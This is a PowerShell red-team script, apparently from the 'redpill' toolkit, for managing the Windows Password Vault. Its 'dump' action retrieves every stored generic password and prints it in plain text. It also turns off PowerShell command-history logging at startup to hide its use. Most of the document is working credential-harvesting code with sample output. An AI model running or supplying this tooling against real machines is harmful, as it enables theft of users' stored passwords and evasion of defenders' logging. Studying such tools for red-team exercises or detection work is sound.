<#
.SYNOPSIS
   Manage Windows Password Vault Items

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19044) x64 bits
   Required Dependencies: VaultSvc
   Optional Dependencies: VaultCmd
   PS cmdlet Dev version: v1.0.7
   
.DESCRIPTION
   Manage Windows Password Vault Items

.NOTES
   This cmdlet only creates or dumps credentials with
   [Generic passwords] It will not decode DPAPI creds.
   Warning: Parameter 'resource' and 'username' are
   required to delete entrys from Password Vault.

.Parameter Action
   Check, Create, Dump, Delete (default: check) 

.Parameter Resource
   Resource or Url (default: https://www.siliconvalley/classified.portal)

.Parameter UserName
   Credential username (default: DOMAIN\USERNAME)

.Parameter Password
   Credential password (defaut: r00t3xp10it)

.EXAMPLE
   PS C:\> .\Invoke-VaultCmd.ps1 -action check
   Check for stored Resource_names with creds

.EXAMPLE
   PS C:\> .\Invoke-VaultCmd.ps1 -action create -resource "MyCredential" -username "SKYNET\pedro" -password "r00t3xp10it"
   Create new vault entry named 'MyCredential' with 'SKYNET\pedro' username and 'r00t3xp10it' as is access password

.EXAMPLE
   PS C:\> .\Invoke-VaultCmd.ps1 -action dump
   Dump ALL generic passwords [plain text] from vault

.EXAMPLE
   PS C:\> .\Invoke-VaultCmd.ps1 -action delete -resource "MyCredential" -username "BillGates"
   Delete resource 'MyCredential' with 'BillGates' username and comrrespondent creds from vault

.INPUTS
   None. You cannot pipe objects into Invoke-VaultCmd.ps1

.OUTPUTS
   [vault] Manage Windows Vault Entrys.
   [vault] Scanning for credential tokens

   Currently loaded vaults:
           Vault: Credenciais Web
           Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
           Location: C:\Users\pedro\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

           Vault: Credenciais do Windows
           Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
           Location: C:\Users\pedro\AppData\Local\Microsoft\Vault

   Secret Vault Name             Resource
   ------ ----------             --------
   DPAPI  Credenciais Web        https://Microsoft/land.com
   DPAPI  Credenciais Web        https://Silliconvalley/log.org
   DPAPI  Credenciais do Windows Domain:interactive=SKYNET\pedro
   DPAPI  Credenciais do Windows Domain:interactive=SKYNET\administrator

   UserName         Resource                      Password Type
   --------         --------                      -------------
   Domain\billGates https://Microsoft/land.com    Hidden::Generic
   SKYNET\pedro     http://Silliconvalley/log.org Hidden::Generic

.LINK
   https://github.com/r00t-3xp10it/redpill/tree/main/lib
   https://sites.utexas.edu/glenmark/2019/10/21/using-passwordvault-with-powershell
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Resource="https://www.siliconvalley/classified.portal",
   [string]$UserName="${Env:COMPUTERNAME}\${Env:USERNAME}",
   [string]$Password="r00t3xp10it",
   [string]$Action="check",
   [string]$Banner="true"
)


$StartBanner = @"

(                                                           
)\ )                           (                    (    )  
(()/(   )       (  (       (    )\ ) (   (    )   (  )\( /(  
/(_)| /( (  (  )\))(   (  )(  (()/( )\  )\( /(  ))\((_)\()) 
(_)) )(_)))\ )\((_)()\  )\(()\  ((_)|(_)((_)(_))/((_)_(_))/  
| _ ((_)_((_|(_)(()((_)((_)((_) _| |\ \ / ((_)_(_))(| | |_   
|  _/ _  (_-<_-< V  V / _ \ '_/ _  | \ V // _  | || | |  _|  
|_| \__,_/__/__/\_/\_/\___/_| \__,_|  \_/ \__,_|\_,_|_|\__| 
"@;
If($Banner -iMatch "true")
{
   write-host $StartBanner -ForegroundColor DarkRed
   write-host "    * GitHub: https://github.com/r00t-3xp10it/redpill *" -ForegroundColor DarkYellow
   Start-Sleep -Milliseconds 500
}


$Names = @()
$CmdletVersion = "v1.0.7"

## Build Output Table Object
$VaultEntrys = New-Object System.Data.DataTable
$VaultEntrys.Columns.Add("Secret")|Out-Null
$VaultEntrys.Columns.Add("Vault Name")|Out-Null
$VaultEntrys.Columns.Add("Resource")|Out-Null

$ErrorActionPreference = "SilentlyContinue"
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
write-host "`n[vault] Manage Windows Vault Entrys." -ForegroundColor Green
$host.UI.RawUI.WindowTitle = "@Invoke-VaultCmd $CmdletVersion {SSA@RedTeam}"

## Make sure mandatory parameter is correct set
If($Action -iNotMatch '^(Check|Create|Dump|Delete)$')
{
   write-host "[vault] wrong parameter -action '$Action' user input.`n" -ForegroundColor Red
   return
}

## Make sure service VaultSvc is running
If((Get-Service -Name "VaultSvc").Status -iNotMatch '^(Running)$')
{
   write-host "[vault] Cmdlet requires 'VaultSvc' service running.`n" -ForegroundColor Red
   return
}


## Initializing the PasswordVault Object
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
$vault = New-Object Windows.Security.Credentials.PasswordVault

$Schemas = $(VaultCmd /list|findstr "Vault:") -replace '^\s*Vault: ',''
ForEach($Token in $Schemas)
{
   ## List credentials existence with VaultCmd builtin software
   $Names = (vaultcmd /listcreds:"$Token" /all|findstr "Resource") -replace 'Resource: ',''
   $Secret = (VaultCmd /listproperties:"$Token"|findstr "Current protection method:") -replace 'Current protection method: ',''

   ForEach($Item in $Names)
   {
      ## Add entrys found to Table
      $VaultEntrys.Rows.Add("$Secret","$Token","$Item")|Out-Null
   }
}


If($Action -iMatch '^(check)$')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Scanning for credential tokens

   .OUTPUTS
      [vault] Manage Windows Vault Entrys.
      [vault] Scanning for credential tokens

      Currently loaded vaults:
              Vault: Credenciais Web
              Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
              Location: C:\Users\pedro\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

              Vault: Credenciais do Windows
              Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
              Location: C:\Users\pedro\AppData\Local\Microsoft\Vault

      Secret Vault Name             Resource
      ------ ----------             --------
      DPAPI  Credenciais Web        http://Silliconvalley/log.org
      DPAPI  Credenciais do Windows Domain:interactive=SKYNET\pedro
      DPAPI  Credenciais do Windows Domain:interactive=SKYNET\administrator

      UserName     Resource                      Password Type
      --------     --------                      -------------
      SKYNET\pedro http://Silliconvalley/log.org Hidden::Generic
   #>

   write-host "[vault] " -ForegroundColor Green -NoNewline
   write-host "Scanning for credential tokens`n"

   VaultCmd /list ## Currently loaded vaults
   ## Print OnScreen existing creds (DPAPI + GENERIC) inside passwordvault
   $VaultEntrys | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 2

   Start-Sleep -Milliseconds 900
   ## Check if vault contains any Generic creds
   If(($vault.RetrieveAll()) -ne $null)
   {
      ## Use GUI ??? Or Format-Table outputs?
      # $vault.RetrieveAll() | Out-GridView -title "credentials dump"
      $vault.RetrieveAll() | Select-Object Username,Resource,@{Name='Password Type';Expression={"Hidden::Generic"}} |
         Out-String -Stream | Select-Object -SkipLast 1
   }
   Else
   {
      write-host "`n[vault] none valid credentials to decode found inside vault.`n" -ForegroundColor Red
   }
}


If($Action -iMatch '^(create)$')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Create credential with Generic password

   .OUTPUTS
      [vault] Manage Windows Vault Entrys.
      [vault] Creating https://siliconvalley/Classified.portal credential

      UserName     Resource                                Password Type
      --------     --------                                -------------
      SKYNET\pedro https://siliconvalley/Classified.portal Hidden::Generic
   #>

   write-host "[vault] " -ForegroundColor Green -NoNewline
   write-host "Creating " -NoNewline
   write-host "$Resource" -ForegroundColor DarkYellow -NoNewline
   write-host " credential`n"

   ## Make sure mandatory param its set
   If([string]::IsNullOrEmpty($Resource))
   {
      write-host "[vault] Error: missing -resource parameter input.`n" -ForegroundColor Red
      return
   }

   ## Make sure 'Resource name' and 'Username' to create does NOT exist in vault 
   If([bool]($vault.RetrieveAll()|Where-Object{$_.Resource -eq "$Resource" -and $_.UserName -eq "$UserName"}) -Match "True")
   {
      ## Print OnScreen existing creds (DPAPI + GENERIC) inside passwordvault
      $VaultEntrys | Format-Table -AutoSize | Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1

      Start-Sleep -Milliseconds 1100
      ## Print OnScreen existing 'usernames' with 'resource' names associated.
      $vault.RetrieveAll() | Select-Object Username,Resource,@{Name='Password Type';Expression={"Hidden::Generic"}} |
         Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1

         write-host "[vault] Error: " -ForegroundColor Red -NoNewline
         write-host "$Resource" -ForegroundColor DarkYellow -NoNewline
         write-host " with username " -ForegroundColor Red -NoNewline
         write-host "$UserName" -ForegroundColor DarkYellow -NoNewline
         write-host " exists.`n" -ForegroundColor Red
         return          
   }

   ## Create unique credential ObjectAPI
   $cred = New-Object windows.Security.Credentials.PasswordCredential
   $cred.Resource = "$Resource"
   $cred.UserName = "$UserName"
   $cred.Password = "$Password"
   $vault.Add($cred)

   Start-Sleep -Milliseconds 800
   # ReView credential existance now
   If(($vault.RetrieveAll()) -ieq $null)
   {
      write-host "[vault] Error: fail to create: $Resource.`n" -ForegroundColor Red
   }
   Else
   {
      ## Print OnScreen just the recent created credential info
      $titanio = ($vault.RetrieveAll()).UserName|Where-Object{$_ -iMatch "$Username"}
      $vault.RetrieveAll() | Where-Object { $_.Resource -iMatch "^($REsource)$" -and $_.UserName -iMatch "$titanio"} |
         Select-Object -Property UserName,Resource,@{Name='Password Type';Expression={"Hidden::Generic"}} |
         Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1
   }

   ## Variable CleanUp
   Remove-Variable cred
}


If($Action -iMatch '^(dump)$')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Dump plain text [Generic passwords] creds

   .NOTES
      This function dumps ALL generic passwords found

   .OUTPUTS
      Currently loaded vaults:
            Vault: Credenciais Web
            Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
            Location: C:\Users\pedro\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

            Vault: Credenciais do Windows
            Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
            Location: C:\Users\pedro\AppData\Local\Microsoft\Vault

    Secret Vault Name             Resource
    ------ ----------             --------
    DPAPI  Credenciais Web        https://siliconvalley/Classified.portal
    DPAPI  Credenciais do Windows Domain:interactive=SKYNET\pedro
    DPAPI  Credenciais do Windows Domain:interactive=SKYNET\administrator

    UserName     Resource                                Password
    --------     --------                                --------
    SKYNET\pedro https://siliconvalley/Classified.portal r00t3xp10it
   #>

   write-host "[vault] " -ForegroundColor Green -NoNewline
   write-host "Retrieving plain text credentials`n" 

   VaultCmd /list ## Currently loaded vaults
   ## Print OnScreen existing creds (DPAPI + GENERIC) inside passwordvault
   $VaultEntrys | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 1

   Start-Sleep -Milliseconds 800
   ## Check if we have any credentials to display
   $CheckForCredentials = $vault.RetrieveAll()
   If([string]::IsNullOrEmpty($CheckForCredentials))
   {
      write-host "[Vault] none valid credentials to decode found inside vault.`n" -ForegroundColor Red
      return
   }

   ## Dump ALL valid credentials [Generic] in plain text 
   $vault.RetrieveAll() | % { $_.RetrievePassword(); $_ } |
      Select-Object -Property UserName,Resource,Password | Format-Table -AutoSize |
      Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1
}


If($Action -iMatch '^(delete)$')
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Delete Resource name from vault

   .NOTES
      Parameters 'resource' and 'username' are
      mandatory to successfull delete entrys..

   .OUTPUTS
      Currently loaded vaults:
            Vault: Credenciais Web
            Vault Guid:4BF4C442-9B8A-41A0-B380-DD4A704DDB28
            Location: C:\Users\pedro\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28

            Vault: Credenciais do Windows
            Vault Guid:77BC582B-F0A6-4E15-4E80-61736B6F3B29
            Location: C:\Users\pedro\AppData\Local\Microsoft\Vault

    Secret Vault Name             Resource
    ------ ----------             --------
    DPAPI  Credenciais Web        https://siliconvalley/Classified.portal
    DPAPI  Credenciais do Windows Domain:interactive=SKYNET\pedro
    DPAPI  Credenciais do Windows Domain:interactive=SKYNET\administrator

    UserName     Resource                                State
    --------     --------                                -----
    SKYNET\pedro https://siliconvalley/Classified.portal Deleted
   #>

   write-host "[vault] " -ForegroundColor Green -NoNewline
   write-host "Deleting '$Resource' from vault.`n"

   VaultCmd /list ## Currently loaded vaults
   ## Print OnScreen existing creds (DPAPI + GENERIC) inside passwordvault
   $VaultEntrys | Format-Table -AutoSize | Out-String -Stream | Select-Object -SkipLast 1

   ## Make sure 'Resource name' + 'Username' to delete exists in vault 
   If([bool]($vault.RetrieveAll()|Where-Object{$_.Resource -eq "$Resource" -and $_.UserName -eq "$UserName"}) -Match "False")
   {
      Start-Sleep -Milliseconds 800
      ## Print OnScreen existing 'usernames' with 'resource' names associated.
      $vault.RetrieveAll() | Select-Object Username,Resource,@{Name='Password Type';Expression={"Hidden::Generic"}} |
         Out-String -Stream | Select-Object -Skip 1 | Select-Object -SkipLast 1

      write-host "[vault] not found: " -ForegroundColor Red -NoNewline
      write-host "$Resource" -ForegroundColor DarkYellow -NoNewline
      write-host " with username " -ForegroundColor Red -NoNewline
      write-host "$UserName`n" -ForegroundColor DarkYellow
      return          
   }

   #Removing Unique Credential API
   $cred = New-Object Windows.Security.Credentials.PasswordCredential
   $cred.Resource = "$Resource"
   $cred.UserName = "$UserName"
   $vault.Remove($cred)

   Start-Sleep -Milliseconds 1200
   ## Make sure 'Resource name' and 'Username' to delete exists in vault 
   If([bool]($vault.RetrieveAll()|Where-Object{$_.Resource -eq "$Resource" -and $_.UserName -eq "$UserName"}) -Match "True")
   {
      write-host "[vault] fail to delete " -ForegroundColor Red -NoNewline
      write-host "$Resource`n" -ForegroundColor DarkYellow -NoNewline

      write-host "[vault] " -ForegroundColor Red -NoNewline
      write-host "review " -NoNewline
      write-host "$Username" -ForegroundColor DarkYellow -NoNewline
      write-host " and " -NoNewline
      write-host "$Resource" -ForegroundColor DarkYellow -NoNewline
      write-host " parameters.`n"
      return          
   }
   Else
   {
      $DeleteUserNam = $cred.UserName
      $Results = [PSCustomObject]@{
         UserName = "$DeleteUserNam"
         Resource = "$Resource"
         State = "deleted"
      }

      ## Colorize the output Table
      $Results | Out-String -Stream | Select-Object -Skip 1 |  Select-Object -SkipLast 1    
   }

   ## Variable CleanUp
   Remove-Variable cred
}